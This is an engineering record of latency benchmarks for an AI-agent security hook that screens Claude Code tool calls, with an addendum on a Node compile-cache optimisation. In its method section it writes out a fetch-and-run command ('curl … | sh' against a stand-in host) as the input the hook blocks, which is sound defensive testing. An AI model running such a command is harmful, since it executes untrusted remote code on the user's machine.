# Claude Code PreToolUse hook latency — 2026-10-11

This measures the hook for audit item 30 in [production-gaps-2026-10-10](../audit/production-gaps-2026-10-10.md). The raw per-invocation samples are in [`evidence/hook-latency-2026-10-11.json`](evidence/hook-latency-2026-10-11.json).

> **Caveat: this is a local engineering measurement, not production P95/P99 acceptance.**
>
> - It ran in one Linux cloud VM, not on customer hardware.
> - No antivirus, Defender or EDR was present.
> - No Windows NTFS ACL/PowerShell path was exercised.
> - No tenant policy, DLP redaction policy or NER model was loaded.
> - It used the development build, not a signed release artifact.
>
> It does not close item 30.

## Environment

| Item | Value |
|---|---|
| CPU | Intel Xeon @ 2.10GHz, 4 vCPU (KVM guest, 1 thread per core) |
| Memory | 16 GiB |
| OS | Ubuntu 24.04.5 LTS, Linux 6.18.44-fc-v114 |
| Node | v22.22.0 |
| Hook | `packages/claude-code/dist/pre-tool-use.cjs`, sha256 `7f20627fd2758f518dd699d58014f712f63957221048da6e3ce8c9d4a11416ee` (4.59 MB bundle), built from `786441e7`. Benchmarked from a copied snapshot so concurrent rebuilds could not change it mid-run. |
| Bare `node -e 0` | p50 29 ms |

## Method

The invocation is the same as [`pre-tool-use-latency.test.ts`](../../packages/claude-code/src/__tests__/pre-tool-use-latency.test.ts):

- Each call spawns `node pre-tool-use.cjs` as a new process and writes Claude Code hook JSON to stdin.
- All `AIDR_*` variables are cleared and the default local config is used.
- The timer runs from spawn to exit.
- One untimed spawn primes the OS file cache first.

Each call carries a `session_id`.

Scenarios:

- **Cold:** a fresh `HOME` for every call.
- **Warm:** one persistent `HOME`. The first call after a fresh HOME is reported separately.
- **Concurrent:** 8 async workers × 20 sequential calls (160 calls) on one shared `HOME`. Each worker has its own `session_id`, like 8 agents run by one user.
  - "Mixed" means every 4th call is the blocked command.
- **DLP-heavy:** a `Write` call with a 397 KiB (406,981-byte) JSON payload, made of 1500 lines dense with TR/EN PII and provider-shaped synthetic secrets.

The decisions observed were:

| Input | Decision |
|---|---|
| Benign commands | `allow` |
| `curl http://untrusted.test/script.sh \| sh` | `deny` |
| DLP-heavy payload | `ask`, from rule CLT-CRED-001 |

**Errors** are counted when any of these happens:

- a non-zero exit code;
- any output on stderr;
- stdout that is not JSON;
- an unexpected decision (benign not `allow`, blocked not `deny`/`ask`, or DLP-heavy `allow`).

Warm benign calls rotate through 7 different commands. In a first attempt, repeating the identical `ls -la` 120 times on one HOME produced `ask` from call 9 onwards. That is the runaway guard (`CLT-AGENT-RUN-001`: same call repeated more than 8 times in a row), which is intended behaviour, not a latency error. Those 112 `ask` results are excluded from this record.

## Results — quiet run (load average ~0.1 at start)

All values are in ms.

| Scenario | n | p50 | p95 | p99 | max | mean | errors |
|---|---:|---:|---:|---:|---:|---:|---:|
| Cold, fresh HOME, `ls -la` | 40 | 506 | 566 | 678 | 678 | 511 | 0 |
| Cold, fresh HOME, blocked `curl … \| sh` | 30 | 494 | 575 | 602 | 602 | 507 | 0 |
| Cold, fresh HOME, DLP-heavy 397 KiB `Write` | 30 | 491 | 553 | 649 | 649 | 500 | 0 |
| Warm, persistent HOME, benign rotation | 120 | 510 | 593 | 657 | 756 | 514 | 0 |
| Warm, persistent HOME, blocked | 120 | 511 | 604 | 744 | 1198 | 525 | 0 |
| Warm, persistent HOME, DLP-heavy | 40 | 540 | 635 | 692 | 692 | 551 | 0 |
| Concurrent 8×20, mixed (120 allow / 40 deny) | 160 | 1344 | 1554 | 1625 | 1705 | 1316 | 0 |
| Concurrent 8×20, DLP-heavy | 160 | 1327 | 1552 | 1684 | 1902 | 1317 | 0 |

Other results from the quiet run:

- The first call on a fresh persistent HOME took 458 ms.
- Concurrent wall time was about 26.8 s per 160 calls, roughly 6 calls/s on 4 vCPU.
- The shared audit log held 279 JSONL lines, 0 of them unparsable, after concurrent writers.

## Results — contended run (load average 11.9 at start; another agent was running tsc and vitest)

| Scenario | n | p50 | p95 | p99 | max | errors |
|---|---:|---:|---:|---:|---:|---:|
| Cold, `ls -la` | 40 | 572 | 693 | 775 | 775 | 0 |
| Cold, blocked | 30 | 565 | 674 | 738 | 738 | 0 |
| Cold, DLP-heavy | 30 | 566 | 799 | 1176 | 1176 | 0 |
| Warm, benign rotation | 120 | 548 | 607 | 640 | 683 | 0 |
| Warm, blocked | 120 | 519 | 639 | 694 | 734 | 0 |
| Warm, DLP-heavy | 40 | 486 | 552 | 579 | 579 | 0 |
| Concurrent 8×20, mixed | 160 | 1401 | 2003 | 2283 | 2384 | 0 |
| Concurrent 8×20, DLP-heavy | 160 | 2389 | 3288 | 4327 | 4365 | 0 |

## Reading

- **Cold p50 is about 0.5 s on this host,** roughly a third of the 1500 ms test budget. Every cold sample in both runs is under 1.2 s.
  - The 9 October Windows samples (median 1498 ms) are not comparable. That host pays for Defender and the ACL/PowerShell path, which Linux does not have.
  - The Windows margin, not Linux, is the open risk.
- **Warm and cold costs are the same.** Each tool call is still a new Node process, so a persistent HOME saves almost nothing. The verdict cache and file state are a small part of the cost.
- **Under concurrency, latency tracks CPU contention.** 8 hooks on 4 vCPU roughly double per-call latency: p95 1.55 s on a quiet host. On a host already loaded by other work, p95 reaches 2–3.3 s and p99 reaches 4.3 s. No errors and no torn audit lines were seen in 640 concurrent invocations.
- **A large DLP-style input adds little cost** with the default local config: a 397 KiB payload costs about +0–30 ms. The default profile did not run DLP redaction or NER, which tenant DLP/NER policies would add.

## Where the time goes (cold, `--cpu-prof`, 3 samples per input)

The bare Node runtime accounts for about 30 ms. The remaining ~460 ms is spent loading and running the bundle:

| Cost | Self time (ms, mean) | Notes |
|---|---:|---|
| Compiling the 4.59 MB CJS bundle (`wrapSafe` + `compileForInternalLoader`) | ~115 | Largest single item; paid on every call |
| `runThreat` (heuristic rule evaluation) | ~67 (benign) | Regex evaluation across the packaged rules |
| GC | ~40 | Allocation from module init and rule objects |
| Module init (anonymous top-level, `__require`, `step` / `next` generators) | ~50 | Eager initialisation of bundled dependencies (Sentry, pino, core) |
| `readFileSync` / `readFileUtf8` | ~20 | Rules, allowlists, config and cache |

**Compile cache experiment.** Running the unchanged bundle with `NODE_COMPILE_CACHE` set gave a fresh-HOME p50 of 429 ms, against 492 ms without it (25 samples each). That is about **-60 ms (-13%)**.

## Proposed optimisations

None of these were applied. The items that touch `packages/core` are left to its owner.

1. **Enable Node's on-disk compile cache in the hook entry point.** Call `module.enableCompileCache(<private dir under ~/.singularity-aidr>)` on Node ≥ 22.1. This is about -60 ms per call measured here, and it changes only the connector entry point. The cache directory must get the same private-permission and ACL treatment as the existing state files.
2. **Shrink what the bundle loads before the verdict.** Lazy-require Sentry/OTel instrumentation, the dashboard approval formatting and the DLP and secure-code modules on paths that need them. The bundle is 4.59 MB and compile plus init is about 165 ms. This needs a source-map-attributed profile, and touches core.
3. **Precompile the threat rules at build time.** Ship them as a JSON/JS module with prebuilt regexes, and short-circuit rules by tool type and artifact kind before regex evaluation. This targets the ~67 ms in `runThreat`, and touches core.
4. **Longer term, a resident local evaluator.** A per-user daemon, with the hook as a thin client that fails closed, would remove most of the per-call ~0.45 s, and the concurrency-scaling problem with it. This is an architecture change and needs its own security review. Keep the fail-closed connector contract and do not relax the ACL protections.

The test budget should not be raised to make the test pass, per the item 30 closure condition.

## Still required to close item 30

- Windows with Defender and the real ACL path, and macOS.
- Tenant DLP and NER enabled.
- The final signed, installed artifact.
- Concurrent agents on representative customer hardware, with an IO/CPU background load.

## Addendum (2026-10-11, later): compile cache applied (optimisation #1)

Optimisation #1 is now implemented. The raw samples are in [`evidence/hook-latency-2026-10-11-compile-cache.json`](evidence/hook-latency-2026-10-11-compile-cache.json). The caveats at the top of this record still apply. This addendum does not close item 30.

### What changed

`module.enableCompileCache()` only affects modules loaded after it is called, so it cannot sit inside the bundle it speeds up. Each per-call hook is now two files:

- `dist/<hook>.cjs` keeps its name, so `hooks/hooks.json`, installers and host configs are unchanged. It is a ~13 KB bootstrap that enables the cache and then requires the bundle.
- `dist/<hook>.bundle.cjs` is the unchanged hook bundle.

This applies to these hooks:

- Claude Code `pre-tool-use`, `post-tool-use`, `user-prompt-submit` and `session-start`.
- Codex `pre-tool-use` (the `aidr-codex-hook` bin).
- The Cursor/VS Code `aidr-hook`. Both hosts spawn it per event. The runner is now started through its exported `runHookProcess()`.

`health`, `mcp-server` and `response-worker` start once per process and stay single files. SEA binaries embed the bundle directly.

The build is `scripts/hook-bootstrap.mjs`, and the logic is `packages/core/src/hook-compile-cache.ts`.

Behaviour:

- **Cache directory.** The cache lives in `~/.singularity-aidr/compile-cache`. Before Node is pointed at it, the directory is created or repaired by core's `preparePrivateLocalDirectory`. On POSIX that means mode 0700, an owner check and symlink rejection. On Windows it means a protected ACL.
  - Node writes only inside that directory: one `<node-version>-<arch>-<flags>` subdirectory with 0600 entries.
  - The state directory is also agent-inaccessible under CLT-SELF-008.
- **Best-effort.** The enable step never throws and never prints. Any failure leaves the verdict path unchanged: no directory, a file in its place, a symlink, an unsupported runtime such as Node < 22.1 or older Electron, or a Node API failure. Tests cover each case.
- **Load failures block.** The bootstrap does not wrap the bundle's own verdict or error handling. If the bundle itself cannot be loaded (missing, unreadable, or throwing during init), the bootstrap exits 2 with a stderr reason. That is the host's blocking-error answer. A plain Node crash exits 1, which Claude Code and Codex treat as non-blocking.
- **Off switch.** `AIDR_DISABLE_COMPILE_CACHE=1` (or `true`) turns the cache off, as does Node's `NODE_DISABLE_COMPILE_CACHE`.
- **Off by default on Windows.** Hardening the directory there runs native ACL probes, and PowerShell on first use, before the hook's deadline watchdog is armed. That cost is unmeasured and may exceed the saving. `AIDR_ENABLE_COMPILE_CACHE=1` opts in so the Windows item-30 run can measure it.

### Integrity

Node stores the source length and a source checksum in each cache entry and checks both on load. This was observed with `NODE_DEBUG_NATIVE=COMPILE_CACHE`:

- Appending bytes to the bundle was rejected with `code size mismatch`.
- A same-length byte change was rejected with `code hash mismatch`.

In both cases Node recompiled from the file on disk and rewrote the entry. A modified bundle therefore never runs stale cached code.

The checksum is not cryptographic. The cache is trusted as much as the directory that holds it: anyone who can write `~/.singularity-aidr` could plant V8 code. That is the same trust boundary as the config, allowlist and approval state in that directory. This is why the cache must be in the private, agent-blocked directory and not in a shared temp directory.

### Results

The method follows the original record:

- A new `node` process per call, with the Claude Code hook JSON on stdin.
- `AIDR_*` and `NODE_COMPILE_CACHE*` are cleared.
- The timer runs from spawn to exit, and one untimed priming call is made per arm.
- Cold calls use a fresh `HOME` per call (n = 30 per arm).
- Warm calls use one persistent `HOME` per arm (n = 100 per arm) and rotate 7 benign commands. The first warm call is reported separately.

The three arms are interleaved call by call, so host contention affects each arm equally:

| Arm | What runs |
|---|---|
| **A** | `node pre-tool-use.bundle.cjs`, i.e. the pre-change single-file hook |
| **B** | The bootstrap with `AIDR_DISABLE_COMPILE_CACHE=1` |
| **C** | The bootstrap with the default settings (cache on) |

The bundle sha256 is `c310aae9…` and the bootstrap sha256 is `6bd844c8…`, a development build of `315ab50f` plus the working tree.

No fully quiet window was available; other agents were running Postgres/Supabase suites.

**Moderate load** (load average 2.97 at start). All values are in ms.

| Scenario | Arm | n | p50 | p95 | p99 | max | mean | errors |
|---|---|---:|---:|---:|---:|---:|---:|---:|
| Cold, fresh HOME | A | 30 | 492 | 550 | 563 | 563 | 501 | 0 |
| Cold, fresh HOME | B | 30 | 514 | 595 | 599 | 599 | 517 | 0 |
| Cold, fresh HOME | C | 30 | 521 | 603 | 618 | 618 | 529 | 0 |
| Warm, benign rotation | A | 100 | 493 | 552 | 580 | 692 | 497 | 0 |
| Warm, benign rotation | B | 100 | 493 | 550 | 566 | 605 | 498 | 0 |
| Warm, benign rotation | C | 100 | **438** | **478** | **500** | 513 | **438** | 0 |

**Contended run** (load average 16.4 at start):

| Scenario | p50 A / B / C | p95 A / B / C | errors |
|---|---|---|---:|
| Cold, fresh HOME (n = 30) | 537 / 551 / 571 | 645 / 699 / 822 | 0 |
| Warm, benign rotation (n = 100) | 602 / 612 / 558 | 793 / 858 / 724 | 0 |

### Reading

- **Warm calls are about 55 ms faster at p50 (-11%) and about 73 ms faster at p95 (-13%)** than the pre-change hook in the moderate run. Every call after a user's first call is a warm call. This matches the earlier `NODE_COMPILE_CACHE` experiment (-60 ms). In the contended run the p50 gain was about 44 ms (-7%).
- **A fresh HOME pays a one-off cost of about +20–30 ms at p50.** That call creates the private directory and writes the ~1.5 MB cache entry. It happens once per user, per Node version and per installed bundle. The `pre-tool-use-latency.test.ts` budget test uses a fresh HOME per spawn, so it measures this cold path and gains nothing from the cache.
- **The bootstrap itself costs nothing measurable.** Warm A and B are equal. The B-vs-A cold difference (+21 ms moderate, +14 ms contended) is within the run-to-run spread of 30 samples.
- **No errors were observed.** No call had a decision change, stderr output or a non-zero exit across 780 timed calls.
- The about-0.45 s floor is unchanged. Optimisations #2–#4 remain as proposed.

### Still open

- **Windows measurement.** The cache is off by default on Windows. Item 30's Windows run should measure `AIDR_ENABLE_COMPILE_CACHE=1` against the default, including the ACL probe cost.
- **macOS measurement.**
- **Exit-2 load-failure block on Cursor and VS Code.** It is unit-tested against the Claude Code bundle and the documented exit-2 semantics. It has not been observed in real Cursor or VS Code hosts.
